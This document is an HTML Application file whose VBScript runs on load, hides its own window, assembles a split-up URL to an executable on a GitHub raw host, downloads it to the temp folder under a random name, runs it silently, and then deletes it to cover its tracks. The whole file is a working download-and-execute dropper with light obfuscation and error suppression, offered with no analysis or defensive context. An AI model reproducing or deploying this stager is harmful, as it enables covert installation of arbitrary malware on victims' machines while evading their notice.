<html>
<head>
  <title>Downloader - PowerShell Download</title>
  <HTA:APPLICATION
    ID="app"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  >
  <script language="VBScript">
    Sub Window_OnLoad()
      On Error Resume Next

      ' Hide window
      window.resizeTo 0, 0
      window.moveTo -10000, -10000

      Dim p1, p2, p3, p4, url, filePath
      p1 = "ht"
      p2 = "tps:"
      p3 = "//raw."
      p4 = "githubusercontent.com/wasderlol/test/main/test.exe"
      url = p1 & p2 & p3 & p4

      Dim fso, shell, tempPath
      Set fso = CreateObject("Scripting.FileSystemObject")
      tempPath = fso.GetSpecialFolder(2) & "\tempfile" & CStr(Int((9999 * Rnd) + 1000)) & ".exe"

      Dim http, stream
      Set http = CreateObject("MSXML2.XMLHTTP")
      http.Open "GET", url, False
      http.Send

      If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 'binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile tempPath, 2
        stream.Close

        Set shell = CreateObject("WScript.Shell")
        shell.Run Chr(34) & tempPath & Chr(34), 0, False

        ' Delayed deletion (best effort)
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        wsh.Run "cmd /c ping 127.0.0.1 -n 5 > nul & del """ & tempPath & """", 0, False
      Else
        MsgBox "Download failed with status " & http.Status, vbExclamation, "Error"
      End If

      window.close()
    End Sub
  </script>
</head>
<body>
</body>
</html>
